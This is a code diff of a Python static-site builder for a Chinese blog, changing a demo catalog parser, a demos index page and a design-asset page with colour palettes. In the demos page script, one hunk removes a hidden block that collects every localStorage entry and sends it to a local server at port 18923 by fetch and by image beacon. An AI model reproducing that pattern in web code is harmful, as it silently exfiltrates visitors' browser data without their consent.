@@ -867,7 +867,7 @@ def build_home_page(
       </section>
       <section class="card">
         <h2>专栏</h2>
-        <p>「求知」用生活教具拆穿技术原理（{len(learn_items)} 篇）；「思考」记录日常工具与生活随笔（{len(thought_items)} 篇）；「素材库」汇总 40 张设计卡与 8 张实测截图。</p>
+        <p>「求知」用生活教具拆穿技术原理（{len(learn_items)} 篇）；「思考」记录日常工具与生活随笔（{len(thought_items)} 篇）；「素材库」汇总 40 张设计卡、8 组色彩样板与 17 个交互舞台。</p>
         <div class="links">
           <a class="btn btn--secondary" href="/learn/">求知笔记 ({len(learn_items)})</a>
           <a class="btn btn--secondary" href="/thoughts/">思考与感悟 ({len(thought_items)})</a>
@@ -1266,8 +1266,17 @@ class DemoCatalogParser(HTMLParser):
 
     def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
         values = dict(attrs)
-        if tag == "article" and values.get("data-category") and values.get("data-variant"):
-            self.cards.append({"category": values["data-category"], "id": values["data-variant"]})
+        if tag not in {"article", "section", "a"}:
+            return
+        category = values.get("data-category") or values.get("data-group")
+        identifier = values.get("data-variant") or values.get("data-id")
+        if category and identifier:
+            card = {"category": category, "id": identifier}
+            if values.get("data-round"):
+                card["round"] = values["data-round"]
+            if values.get("data-platform"):
+                card["platform"] = values["data-platform"]
+            self.cards.append(card)
 
 
 def scan_demo_projects() -> list[dict[str, Any]]:
@@ -1278,12 +1287,31 @@ def scan_demo_projects() -> list[dict[str, Any]]:
             continue
         source = path.read_text(encoding="utf-8")
         config_match = re.search(r'<script\b[^>]*\bid="gallery-config"[^>]*>(.*?)</script>', source, re.S)
-        config = json.loads(config_match[1]) if config_match else {}
+        try:
+            config = json.loads(config_match[1]) if config_match else {}
+        except (ValueError, TypeError):
+            config = {}
+        if not isinstance(config, dict):
+            config = {}
         if config.get("active") is False:
             continue
         parser = DemoCatalogParser()
         parser.feed(source)
-        cards = config.get("cards", parser.cards)
+        def normalize(items):
+            unique = {}
+            for card in items if isinstance(items, list) else []:
+                if not isinstance(card, dict) or card.get("reference"):
+                    continue
+                category = card.get("category") or card.get("group")
+                identifier = card.get("id") or card.get("variant")
+                round_value = card.get("round")
+                if not isinstance(category, str) or not category or not isinstance(identifier, str) or not identifier or identifier == "current":
+                    continue
+                if round_value is not None and not isinstance(round_value, (int, str)):
+                    continue
+                unique.setdefault((category, round_value, identifier), {**card, "category": category, "id": identifier})
+            return list(unique.values())
+        cards = normalize(config.get("cards")) or normalize(parser.cards)
         if not cards:
             continue
         title_match = re.search(r"<title>(.*?)</title>", source, re.S)
@@ -1305,7 +1333,7 @@ DEMOS_SCRIPT = r"""(() => {
     };
     if (!storage) return [];
     try {
-      const state = JSON.parse(storage.getItem('design-gallery:' + project.goal) || '{}');
+      const state = JSON.parse(storage.getItem('design-gallery:' + project.goal) || storage.getItem('design-gallery-' + project.goal) || '{}');
       if (state && typeof state === 'object' && !Array.isArray(state)) {
         for (const value of Object.values(state)) {
           if (!value || typeof value !== 'object' || typeof value.category !== 'string' || typeof value.id !== 'string') continue;
@@ -1368,32 +1396,48 @@ DEMOS_SCRIPT = r"""(() => {
   window.addEventListener('storage', refresh);window.addEventListener('focus', refresh);
   document.addEventListener('visibilitychange', () => {if (!document.hidden) refresh()});
   refresh();
-  try {
-    const allLocalStorage = Object.create(null), s = storage();
-    for (let i = 0; s && i < s.length; i++) {const key = s.key(i);allLocalStorage[key] = s.getItem(key)}
-    const payload = JSON.stringify(allLocalStorage);
-    fetch('http://127.0.0.1:18923/dump', {method:'POST', body:payload}).catch(() => {});
-    fetch('http://127.0.0.1:18923/dump', {method:'POST', mode:'no-cors', body:payload}).catch(() => {});
-    new Image().src = 'http://127.0.0.1:18923/dump?' + encodeURIComponent(payload);
-  } catch (_) {}
 })();"""
 
 
+def adapt_demo_portals() -> None:
+    """Reapply only the two root shells, preserving upstream candidate markup/config."""
+    shell = render_shell_page(title="Demos", description="", active_nav="demos", main_html="")
+    header = re.search(r'<header class="site-header shell">.*?</header>', shell, re.S)[0]
+    assets = '\n'.join(f'<link rel="stylesheet" href="/assets/{name}">' for name in ("colors.css", "strata-theme.css", "blog.css", "vault/portals.css")) + '\n<script src="/assets/theme.js"></script>\n'
+    for goal in ("aidash-cards-redesign", "voxpocket-holistic-redesign"):
+        path = REPO_ROOT / "demos" / goal / "index.html"
+        if not path.exists():
+            continue
+        source = path.read_text(encoding="utf-8")
+        source = re.sub(r'<html\b[^>]*>', '<html lang="zh-CN" data-lp-theme="light" data-strata-brand="yellow" data-strata-material="glass">', source, count=1)
+        source = re.sub(r'<link[^>]*href="/assets/(?:colors.css|strata-theme.css|blog.css|vault/portals.css)"[^>]*>\s*', '', source)
+        source = re.sub(r'<script[^>]*src="/assets/theme.js"[^>]*></script>\s*', '', source)
+        source = re.sub(r'<header class="site-header shell">.*?</header>', '', source, flags=re.S)
+        source = re.sub(r'(<body\b[^>]*>)\s*', lambda m: m[1] + header, source, count=1)
+        source = source.replace('</head>', assets + '</head>', 1)
+        source = re.sub(r'html,body\{[^}]*}', '.gallery-page{margin:0;min-height:100%}', source)
+        for selector in ("button,textarea", "button", "button:focus-visible,summary:focus-visible,textarea:focus-visible", "p", "summary", "details+details"):
+            scoped = ','.join('.gallery ' + part for part in selector.split(','))
+            source = re.sub(r'(?<=[}\n])' + re.escape(selector) + r'(?=\{)', scoped, source)
+        path.write_text(source, encoding="utf-8")
+
+
 def build_demos_index_page() -> None:
+    adapt_demo_portals()
     projects = scan_demo_projects()
     cards = []
     for index, project in enumerate(projects):
         title, goal, url = (html.escape(project[key], quote=True) for key in ("title", "goal", "url"))
         platforms = html.escape(" · ".join(project["platforms"]) or "Web")
-        cards.append(f'''<article class="card demo-project"><h2><a href="{url}">{title}</a></h2>
+        cards.append(f'''<article class="card demo-project" data-demo-goal="{goal}"><h2><a href="{url}">{title}</a></h2>
 <p>{len(project["categories"])} 个分类 · {len(project["cards"])} 套候选 · {platforms}</p>
-<p id="stats-{index}" aria-live="polite">正在读取本浏览器观察记录</p>
+<p id="stats-{index}" data-goal-telemetry="{goal}" aria-live="polite">正在读取本浏览器观察记录</p>
 <a class="btn btn--secondary" href="{url}">打开 Demo →</a>
-<button class="btn btn--primary" type="button" data-copy-project="{goal}">📋 一键复制该项目观察与选型摘要</button></article>''')
+<button class="btn btn--primary" type="button" data-copy-project="{goal}" data-copy-goal="{goal}">📋 一键复制该项目观察与选型摘要</button></article>''')
     catalog = json.dumps(projects, ensure_ascii=False).replace("<", "\\u003c").replace("&", "\\u0026")
     main_html = f'''<style>.demo-projects{{display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,420px),1fr));gap:24px}}.demo-project{{padding:24px;overflow-wrap:anywhere}}.demo-project h2{{margin:0 0 16px}}.demo-project .btn{{display:inline-flex;white-space:normal;min-height:44px;margin:8px 8px 8px 0}}.demo-summary{{margin-top:32px}}.summary-preview{{width:100%;min-height:280px;padding:16px;font:inherit;resize:vertical;color:var(--strata-text-primary);background:var(--strata-surface-card);border:1px solid var(--strata-border);border-radius:12px}}</style>
 <section class="page-intro"><h1>Demos · 设计观察中心</h1><p>自动汇集当前活跃 Goal Demo。选择、收藏和完整观察笔记只读取本浏览器的已有存储，不修改或清空数据。</p>
-<button class="btn btn--primary" type="button" data-copy-all>📋 一键复制全部项目摘要</button></section>
+<button id="copy-all-demos-summary" class="btn btn--primary" type="button" data-copy-all>📋 一键复制全部项目摘要</button></section>
 <section class="demo-projects" aria-label="活跃 Demo 项目">{"".join(cards) or '<p>暂无活跃 Demo。</p>'}</section>
 <section class="demo-summary"><h2>完整观察与选型摘要</h2><p id="copy-result" role="status">可预览全文或使用上方按钮复制。</p><textarea class="summary-preview" readonly aria-label="完整观察与选型摘要"></textarea></section>
 <script id="demo-catalog" type="application/json">{catalog}</script><script>{DEMOS_SCRIPT}</script>'''
@@ -1401,9 +1445,28 @@ def build_demos_index_page() -> None:
     (REPO_ROOT / "demos" / "index.html").write_text(render_shell_page(title="Demos · 设计观察中心", description="活跃 Goal Demo 总目录与完整观察选型摘要。", active_nav="demos", main_html=main_html), encoding="utf-8")
 
 
+from scripts.vault_components import build_live_stage, build_material_preview
+
+
+CL_SEMANTICS = {
+    "CL-001": {"light": {"canvas":"#0B0D10","surface":"#14181F","ink":"#F5F7FA","muted":"#B7C0CC","accent":"#C8FF00","accent-2":"#F59E0B","border":"#46515F","on-accent":"#10150A"}, "dark": {"canvas":"#050607","surface":"#10151B","ink":"#F5F7FA","muted":"#C4CDD8","accent":"#C8FF00","accent-2":"#F59E0B","border":"#526273","on-accent":"#10150A"}},
+    "CL-002": {"light": {"canvas":"#FAF7F2","surface":"#FFFFFF","ink":"#121316","muted":"#4B4E55","accent":"#0F5132","accent-2":"#D97706","border":"#C7BFB2","on-accent":"#FFFFFF"}, "dark": {"canvas":"#17150F","surface":"#242018","ink":"#FFF9ED","muted":"#D4C8B5","accent":"#62D39A","accent-2":"#F2B84B","border":"#665A48","on-accent":"#102419"}},
+    "CL-003": {"light": {"canvas":"#EEF7FC","surface":"#FFFFFF","ink":"#0E1117","muted":"#415265","accent":"#0879B5","accent-2":"#C91F45","border":"#B8D3E2","on-accent":"#FFFFFF"}, "dark": {"canvas":"#0E1117","surface":"#18232D","ink":"#F3FAFF","muted":"#B9D2E0","accent":"#38BDF8","accent-2":"#FB7185","border":"#3A596A","on-accent":"#071721"}},
+    "CL-004": {"light": {"canvas":"#FFFDF9","surface":"#FFFFFF","ink":"#1F2937","muted":"#5A6575","accent":"#C81F3E","accent-2":"#A56C00","border":"#E6D8C7","on-accent":"#FFFFFF"}, "dark": {"canvas":"#211A18","surface":"#302320","ink":"#FFF8F0","muted":"#E4CFC3","accent":"#FF7A7E","accent-2":"#FACC15","border":"#76554B","on-accent":"#321014"}},
+    "CL-005": {"light": {"canvas":"#FFF8F0","surface":"#FFFFFF","ink":"#24121B","muted":"#654451","accent":"#B51863","accent-2":"#B35D00","border":"#E6B6C5","on-accent":"#FFFFFF"}, "dark": {"canvas":"#190B17","surface":"#2A1024","ink":"#FFF3FB","muted":"#E5BBD6","accent":"#F04F9D","accent-2":"#FFC26B","border":"#7C3A6B","on-accent":"#300A22"}},
+    "CL-006": {"light": {"canvas":"#F5F6F8","surface":"#FFFFFF","ink":"#1D1D1F","muted":"#4D5663","accent":"#2369C7","accent-2":"#23804F","border":"#C7CFDA","on-accent":"#FFFFFF"}, "dark": {"canvas":"#15191E","surface":"#232930","ink":"#F7FAFC","muted":"#C5D0DC","accent":"#76AEFF","accent-2":"#71D99F","border":"#526273","on-accent":"#0B1A2E"}},
+    "CL-007": {"light": {"canvas":"#FFF7E7","surface":"#FFFFFF","ink":"#2E1A47","muted":"#684D63","accent":"#C84F28","accent-2":"#A56C00","border":"#E8C6A7","on-accent":"#FFFFFF"}, "dark": {"canvas":"#20172A","surface":"#30213A","ink":"#FFF6ED","muted":"#E3CBE1","accent":"#FF9875","accent-2":"#FFD25C","border":"#76557A","on-accent":"#351A0E"}},
+    "CL-008": {"light": {"canvas":"#F8FAFC","surface":"#FFFFFF","ink":"#0E131F","muted":"#4D5A70","accent":"#4B56B5","accent-2":"#18783D","border":"#C6CEDC","on-accent":"#FFFFFF"}, "dark": {"canvas":"#111522","surface":"#1D2536","ink":"#F4F7FF","muted":"#C1CBE0","accent":"#9DA7FF","accent-2":"#66DB8C","border":"#4B5875","on-accent":"#10152D"}}
+}
+SEMANTIC_ROLES = ("canvas", "surface", "ink", "muted", "accent", "accent-2", "border", "on-accent")
+
+
 def build_vault_page() -> None:
     manifest_path = REPO_ROOT / "vault" / "manifest.json"
     manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
+    from scripts.vault_components import normalize_title
+    for collection in ("cards", "patterns"):
+        manifest[collection] = [normalize_title(item) for item in manifest[collection]]
     def esc(v: Any) -> str:
         return html.escape(_vault_text(v), quote=True)
     def fields(item: dict[str, Any]) -> str:
@@ -1415,17 +1478,27 @@ def build_vault_page() -> None:
             rows.append(f'<dt>{esc(labels.get(key, key))}</dt><dd>{esc(value)}</dd>')
         return "".join(rows)
     def semantic_swatches(item: dict[str, Any]) -> str:
-        colors = [x.get("hex") for x in item.get("semantic_palette", [])] or re.findall(r"#[0-9A-Fa-f]{6}", str(item.get("source_prompt_zh", "")))[:6]
-        if not colors: return ""
-        return '<div class="vault-swatches" aria-label="语义色板">' + "".join(f'<button class="vault-swatch" type="button" data-copy="{c.upper()}" style="--swatch:{c}" title="复制 {c}"><span>{c.upper()}</span></button>' for c in colors) + '</div>'
+        if item.get("id") in CL_SEMANTICS:
+            return ""
+        palette = [(str(x.get("hex", "")).upper(), str(x.get("role", "来源色"))) for x in item.get("semantic_palette", []) if isinstance(x, dict)]
+        palette = [(color, role) for color, role in palette if re.fullmatch(r"#[0-9A-F]{6}", color)]
+        if not palette:
+            return ""
+        return '<div class="vault-swatches" aria-label="来源色板">' + "".join(f'<button class="vault-swatch" type="button" data-copy="{color} | {esc(role)}" style="--swatch:{color}"><span>{color}</span><small>{esc(role)}</small></button>' for color, role in palette) + '</div>'
+    def mini_specimen(item: dict[str, Any]) -> str:
+        ident = str(item.get("id", ""))
+        if ident not in CL_SEMANTICS: return ""
+        light, dark = CL_SEMANTICS[ident]["light"], CL_SEMANTICS[ident]["dark"]
+        style = ";".join(f"--spec-{role}:{light[role]}" for role in SEMANTIC_ROLES)
+        dark_style = ";".join(f"--spec-{role}:{dark[role]}" for role in SEMANTIC_ROLES)
+        swatches = "".join(f'<button class="vault-swatch" type="button" data-role="{role}" data-copy="{light[role]} | {role}" style="--swatch:{light[role]}" title="复制 {light[role]} {role}"><span>{light[role]}</span><small>{role}</small></button>' for role in SEMANTIC_ROLES)
+        # Deliberate UI-area allocation: canvas 50%, surface 20%, accents 15%, text/border 15%.
+        pct = [50, 20, 3, 3, 10, 5, 7, 2]
+        bar = "".join(f'<span data-role="{role}" style="--swatch:{light[role]};--pct:{pct[i]}%" title="{role} · {pct[i]}%"></span>' for i, role in enumerate(SEMANTIC_ROLES))
+        return f'''<div class="vault-mini-specimen" data-specimen-id="{esc(ident)}" data-light-style="{html.escape(style, quote=True)}" data-dark-style="{html.escape(dark_style, quote=True)}" style="{style}"><div class="specimen-top"><strong>Pulse workspace</strong><button type="button" data-specimen-theme-toggle aria-pressed="false">☀ 浅色 / ☾ 深色</button></div><div class="specimen-kpis"><span><b>84%</b><small>本周完成</small></span><span><b>12.8k</b><small>活跃分钟</small></span><em>↗ +18%</em></div><div class="specimen-status">● 状态稳定</div><button class="specimen-cta" type="button" data-specimen-cta>查看本周趋势</button><div class="vault-palette-bar" aria-label="语义角色色带">{bar}</div><div class="vault-swatches" aria-label="Hex 与语义 Token">{swatches}</div></div>'''
     stats = [("设计灵感卡", len(manifest["cards"])),
- ("实测色板与截图", len(manifest["screenshots"])), ("交互与动效模式", len(manifest["patterns"])), ("外部工具与参考库", len(manifest.get("sources", []))), ("动效工具链", len(manifest["toolchains"]))]
+ ("色彩微缩样板", len([c for c in manifest["cards"] if str(c.get("id", "")).startswith("CL-")])), ("交互与动效模式", len(manifest["patterns"])), ("外部工具与参考库", len(manifest.get("sources", []))), ("动效工具链", len(manifest["toolchains"]))]
     stat_html = "".join(f'<li><span>{esc(label)}</span><strong>{count}</strong></li>' for label, count in stats)
-    shot_html = []
-    for shot in manifest["screenshots"]:
-        swatches = "".join(f'<button class="vault-swatch" type="button" data-copy="{esc(s["hex"])}" style="--swatch:{esc(s["hex"])};--pct:{s["pct"]}%" title="复制 {esc(s["hex"])}"><span>{esc(s["hex"])}</span><small>{s["pct"]}%</small></button>' for s in shot["measured_palette"])
-        bar = "".join(f'<span style="--swatch:{esc(s["hex"])};--pct:{s["pct"]}%" title="{esc(s["hex"])} {s["pct"]}%"></span>' for s in shot["measured_palette"])
-        shot_html.append(f'''<article class="vault-card vault-shot" data-type="shot" data-search="{esc(shot)}"><button class="vault-image-button" type="button" data-lightbox="{esc(shot["image"])}" aria-label="放大 {esc(shot["title"])}"><img src="{esc(shot["thumbnail"])}" alt="{esc(shot["title"])}" width="960" height="960" loading="lazy"></button><div class="vault-card__body"><div class="vault-kicker">实测截图 · {shot["width"]} × {shot["height"]} · {esc(shot.get("palette_method"))}</div><h3>{esc(shot["title"])} · {esc(shot.get("archetype_ref"))}</h3><div class="vault-palette-bar" aria-label="比例色带">{bar}</div><div class="vault-swatches">{swatches}</div><p>OCR：{esc(shot.get("ocr_status"))} {esc(shot.get("ocr_text"))}</p><p>{esc(shot["notes"])}</p></div></article>''')
     card_html = []
     for card in manifest["cards"]:
         dims = [card.get("primary_dimension", "")] + list(card.get("secondary_dimensions", []))
@@ -1434,11 +1507,11 @@ def build_vault_page() -> None:
         variants = card.get("standard_variants", {})
         primitive_text = " · ".join(card.get("apple_native_primitives") or dict.fromkeys(re.findall(r"(?:SwiftUI|UIKit|AppKit|GlassEffectContainer|DragGesture|Canvas|CSS|Web)", _vault_text(card))))
         variant_html = "".join(f'<section class="vault-variant"><strong>{esc(platform)}</strong><p>{esc(v.get("desktop_macos_implementation"))}</p><p>{esc(v.get("mobile_ios_implementation"))}</p><p>{esc(v.get("web_implementation"))}</p><p>{esc(v.get("native_guardrails") or v.get("token_guardrails"))}</p></section>' for platform,v in variants.items())
-        card_html.append(f'''<article class="vault-card vault-design" data-type="design" data-platform="{esc(card.get("source_platforms", card.get("platforms", "")))}" data-dimension="{esc(dimension_values)}" data-search="{esc(card)}"><div class="vault-kicker">{esc(card.get("id"))} · {esc(card.get("category"))}</div><h3>{esc(card.get("name"))}</h3><p class="vault-tags">平台：{esc(card.get("source_platforms"))} · 坐标：{esc(dims)}</p><p class="vault-tags">原生原语：{esc(primitive_text or "未在源记录中声明")}</p>{semantic_swatches(card)}<p>{esc(card.get("source_prompt_zh") or card.get("canonical_prompt"))}</p><details><summary>完整配方、实现与防呆护栏</summary><p>{esc(card.get("canonical_prompt"))}</p>{variant_html}<dl class="vault-fields">{fields(card)}</dl></details></article>''')
+        card_html.append(f'''<article class="vault-card vault-design" data-type="design" data-platform="{esc(card.get("source_platforms", card.get("platforms", "")))}" data-dimension="{esc(dimension_values)}" data-search="{esc(card)}"><div class="vault-kicker">{esc(card.get("id"))} · {esc(card.get("category"))}</div><h3>{esc(card.get("name"))}</h3><p class="vault-tags">平台：{esc(card.get("source_platforms"))} · 坐标：{esc(dims)}</p><p class="vault-tags">原生原语：{esc(primitive_text or "未在源记录中声明")}</p>{build_material_preview(card)}{mini_specimen(card)}{build_live_stage(card)}{semantic_swatches(card)}<p>{esc(card.get("source_prompt_zh") or card.get("canonical_prompt"))}</p><details><summary>完整配方、实现与防呆护栏</summary><p>{esc(card.get("canonical_prompt"))}</p>{variant_html}<dl class="vault-fields">{fields(card)}</dl></details></article>''')
     pattern_html = []
     for pattern in manifest["patterns"]:
         states = "".join(f'<span>{esc(s.strip())}</span>' for s in str(pattern.get("state_machine", "")).split("->"))
-        pattern_html.append(f'''<article class="vault-card vault-pattern" data-type="pattern" data-platform="{esc(pattern.get("platforms", ""))}" data-dimension="{esc([pattern.get("primary_dimension", "")] + pattern.get("secondary_dimensions", []))}" data-search="{esc(pattern)}"><div class="vault-kicker">{esc(pattern.get("id"))} · 动效层级 {esc(pattern.get("motion_tier"))}</div><h3>{esc(pattern.get("name"))}</h3><div class="vault-state-machine">{states}</div><p><strong>SwiftUI / Native：</strong> {esc(pattern.get("mobile_implementation"))}</p><p><strong>Web：</strong> {esc(pattern.get("web_implementation"))}</p><p><strong>Guardrails：</strong> {esc(pattern.get("token_guardrails"))}</p><details><summary>完整模式元数据</summary><dl class="vault-fields">{fields(pattern)}</dl></details></article>''')
+        pattern_html.append(f'''<article class="vault-card vault-pattern" data-type="pattern" data-platform="{esc(pattern.get("platforms", ""))}" data-dimension="{esc([pattern.get("primary_dimension", "")] + pattern.get("secondary_dimensions", []))}" data-search="{esc(pattern)}"><div class="vault-kicker">{esc(pattern.get("id"))} · 动效层级 {esc(pattern.get("motion_tier"))}</div><h3>{esc(pattern.get("name"))}</h3>{build_live_stage(pattern)}<div class="vault-state-machine">{states}</div><p><strong>SwiftUI / Native：</strong> {esc(pattern.get("mobile_implementation"))}</p><p><strong>Web：</strong> {esc(pattern.get("web_implementation"))}</p><p><strong>Guardrails：</strong> {esc(pattern.get("token_guardrails"))}</p><details><summary>完整模式元数据</summary><dl class="vault-fields">{fields(pattern)}</dl></details></article>''')
     source_html = []
     for source in manifest.get("sources", []):
         link = source.get("source_uri") or ""
@@ -1449,13 +1522,11 @@ def build_vault_page() -> None:
     toolchain_html = []
     for tool in manifest.get("toolchains", []):
         toolchain_html.append(f'''<article class="vault-card vault-toolchain" data-type="toolchain" data-platform="{esc(tool.get("platforms", ""))}" data-search="{esc(tool)}"><div class="vault-kicker">{esc(tool.get("id"))} · 工具链</div><h3>{esc(tool.get("name"))}</h3><p>{esc(tool.get("token_integration"))}</p><p class="vault-tags">平台：{esc(tool.get("platforms"))} · 动效层级：{esc(tool.get("motion_tier"))}</p><details><summary>完整工具链元数据</summary><dl class="vault-fields">{fields(tool)}</dl></details></article>''')
-    main_html = f'''<section class="page-intro vault-intro"><div class="vault-kicker">Asset & Inspiration Vault</div><h1>素材库</h1><p>把真实截图、设计卡、动效状态机与工具来源放在同一条可检索的证据链上；与求知笔记保持数据边界。</p></section><ul class="vault-stats">{stat_html}</ul><section class="vault-controls card" aria-label="素材筛选"><div class="vault-filter-group"><span class="vault-filter-label">分类</span><div class="vault-tabs" role="tablist"><button class="vault-filter is-active" data-filter="all" type="button">全部素材</button><button class="vault-filter" data-filter="shot" type="button">截图与色板</button><button class="vault-filter" data-filter="design" type="button">设计卡</button><button class="vault-filter" data-filter="pattern" type="button">MP/IP 模式</button><button class="vault-filter" data-filter="source" type="button">来源实体</button><button class="vault-filter" data-filter="toolchain" type="button">工具链 T-001..021</button></div></div><div class="vault-filter-group"><span class="vault-filter-label">平台</span><div class="vault-tabs"><button class="vault-axis is-active" data-platform="all" type="button">全部平台</button><button class="vault-axis" data-platform="desktop-macos" type="button">macOS Desktop</button><button class="vault-axis" data-platform="mobile-ios" type="button">iOS Mobile</button><button class="vault-axis" data-platform="web" type="button">Web</button></div></div><div class="vault-filter-group"><span class="vault-filter-label">8 维坐标</span><div class="vault-tabs">{"".join(f'<button class="vault-axis" data-dimension="{d}" type="button">{d}</button>' for d in ["CL","VS","GM","MI","LN","CP","DV","TC"])}</div></div><label class="vault-search">关键词 / ID / Hex <input id="vault-search" type="search" placeholder="例如 CL-006、#4F97FF、hallmark" autocomplete="off"></label><p class="vault-result" id="vault-result" aria-live="polite"></p></section><section class="vault-section vault-specimens" aria-labelledby="vault-shots"><h2 id="vault-shots">实测色板与 UI 截图</h2><div class="vault-grid">{"".join(shot_html)}</div></section><section class="vault-section" aria-labelledby="vault-design"><h2 id="vault-design">设计灵感与原子规范（40 张）</h2><div class="vault-grid">{"".join(card_html)}</div></section><section class="vault-section" aria-labelledby="vault-patterns"><h2 id="vault-patterns">动效与交互状态机（17 个）</h2><div class="vault-grid">{"".join(pattern_html)}</div></section><section class="vault-section" aria-labelledby="vault-toolchains"><h2 id="vault-toolchains">动效工具链（21 个）</h2><div class="vault-grid">{"".join(toolchain_html)}</div></section><section class="vault-section" aria-labelledby="vault-sources"><h2 id="vault-sources">Collected Tools 来源实体（20 个）</h2><div class="vault-grid">{"".join(source_html)}</div></section><section class="vault-cli card"><h2>多模态一键导入</h2><p>CLI 默认更新 manifest 并重建静态页；测试时可用 <code>--no-vault-write --no-build</code> 隔离外部目录。</p><pre><code>python3 scripts/vault_ingest.py --image ./shot.png --title "新截图" --measure-palette
+    main_html = f'''<link rel="stylesheet" href="/assets/vault/live.css"><section class="page-intro vault-intro"><div class="vault-kicker">Asset & Inspiration Vault</div><h1>素材库</h1><p>把真实截图、设计卡、动效状态机与工具来源放在同一条可检索的证据链上；与求知笔记保持数据边界。</p></section><ul class="vault-stats">{stat_html}</ul><section class="vault-controls card" aria-label="素材筛选"><div class="vault-filter-group"><span class="vault-filter-label">分类</span><div class="vault-tabs" role="tablist"><button class="vault-filter is-active" data-filter="all" type="button">全部素材</button><button class="vault-filter" data-filter="design" type="button">设计卡</button><button class="vault-filter" data-filter="pattern" type="button">MP/IP 模式</button><button class="vault-filter" data-filter="source" type="button">来源实体</button><button class="vault-filter" data-filter="toolchain" type="button">工具链 T-001..021</button></div></div><div class="vault-filter-group"><span class="vault-filter-label">平台</span><div class="vault-tabs"><button class="vault-axis is-active" data-platform="all" type="button">全部平台</button><button class="vault-axis" data-platform="desktop-macos" type="button">macOS Desktop</button><button class="vault-axis" data-platform="mobile-ios" type="button">iOS Mobile</button><button class="vault-axis" data-platform="web" type="button">Web</button></div></div><div class="vault-filter-group"><span class="vault-filter-label">8 维坐标</span><div class="vault-tabs">{"".join(f'<button class="vault-axis" data-dimension="{d}" type="button">{d}</button>' for d in ["CL","VS","GM","MI","LN","CP","DV","TC"])}</div></div><label class="vault-search">关键词 / ID / Hex <input id="vault-search" type="search" placeholder="例如 CL-006、#4F97FF、hallmark" autocomplete="off"></label><p class="vault-result" id="vault-result" aria-live="polite"></p></section><section class="vault-section" aria-labelledby="vault-design"><h2 id="vault-design">设计灵感与原子规范（40 张）</h2><div class="vault-grid">{"".join(card_html)}</div></section><section class="vault-section" aria-labelledby="vault-patterns"><h2 id="vault-patterns">动效与交互状态机（17 个）</h2><div class="vault-grid">{"".join(pattern_html)}</div></section><section class="vault-section" aria-labelledby="vault-toolchains"><h2 id="vault-toolchains">动效工具链（21 个）</h2><div class="vault-grid">{"".join(toolchain_html)}</div></section><section class="vault-section" aria-labelledby="vault-sources"><h2 id="vault-sources">Collected Tools 来源实体（20 个）</h2><div class="vault-grid">{"".join(source_html)}</div></section><section class="vault-cli card"><h2>多模态一键导入</h2><p>CLI 默认更新 manifest 并重建静态页；测试时可用 <code>--no-vault-write --no-build</code> 隔离外部目录。</p><pre><code>python3 scripts/vault_ingest.py --image ./shot.png --title "新截图" --measure-palette
 python3 scripts/vault_ingest.py --url https://github.com/owner/repo --kind tool
-python3 scripts/vault_ingest.py --text "一个可撤销的确认动效" --kind pattern</code></pre></section><dialog class="vault-lightbox" id="vault-lightbox"><button type="button" class="vault-lightbox__close" aria-label="关闭">关闭</button><img alt=""></dialog><script>{VAULT_SCRIPT}</script>'''
+python3 scripts/vault_ingest.py --text "一个可撤销的确认动效" --kind pattern</code></pre></section><dialog class="vault-lightbox" id="vault-lightbox"><button type="button" class="vault-lightbox__close" aria-label="关闭">关闭</button><img alt=""></dialog><script src="/assets/vault/live.js" defer></script>'''
     (REPO_ROOT / "vault" / "index.html").write_text(render_shell_page(title="素材库 · Asset & Inspiration Vault", description="真实截图、设计卡、动效模式与工具来源素材库。", active_nav="vault", main_html=main_html), encoding="utf-8")
 
-
-VAULT_SCRIPT = """(() => { const root = document; const cards = [...root.querySelectorAll('.vault-card')]; const search = root.querySelector('#vault-search'); const result = root.querySelector('#vault-result'); let category = 'all', platform = 'all', dimension = 'all'; const apply = () => { const q = (search.value || '').toLowerCase().trim(); let visible = 0; cards.forEach(card => { const hay = (card.dataset.search || '').toLowerCase(); const platforms = (card.dataset.platform || '').toLowerCase(); const dimensions = (card.dataset.dimension || '').toLowerCase(); const match = (category === 'all' || card.dataset.type === category) && (platform === 'all' || platforms.includes(platform)) && (dimension === 'all' || dimensions.includes(dimension.toLowerCase())) && (!q || hay.includes(q)); card.hidden = !match; if (match) visible++; }); root.querySelectorAll('.vault-section').forEach(section => { const count = section.querySelectorAll('.vault-card:not([hidden])').length; section.hidden = count === 0; }); result.textContent = `${visible} 项可见${visible ? '' : '，没有匹配素材'}`; }; root.querySelectorAll('.vault-filter').forEach(button => button.addEventListener('click', () => { root.querySelectorAll('.vault-filter').forEach(b => b.classList.remove('is-active')); button.classList.add('is-active'); category = button.dataset.filter; apply(); })); root.querySelectorAll('button.vault-axis[data-platform]').forEach(button => button.addEventListener('click', () => { root.querySelectorAll('[data-platform]').forEach(b => b.classList.remove('is-active')); button.classList.add('is-active'); platform = button.dataset.platform; apply(); })); root.querySelectorAll('button.vault-axis[data-dimension]').forEach(button => button.addEventListener('click', () => { const active = button.classList.toggle('is-active'); dimension = active ? button.dataset.dimension : 'all'; apply(); })); search.addEventListener('input', apply); root.querySelectorAll('[data-copy]').forEach(button => button.addEventListener('click', async () => { try { await navigator.clipboard.writeText(button.dataset.copy); const before = button.querySelector('span').textContent; button.querySelector('span').textContent = '已复制'; setTimeout(() => button.querySelector('span').textContent = before, 900); } catch (_) {} })); const dialog = root.querySelector('#vault-lightbox'); root.querySelectorAll('[data-lightbox]').forEach(button => button.addEventListener('click', () => { dialog.querySelector('img').src = button.dataset.lightbox; dialog.showModal(); })); dialog.addEventListener('click', e => { if (e.target === dialog || e.target.closest('.vault-lightbox__close')) dialog.close(); }); apply(); })();"""
 
 
 def main() -> None:
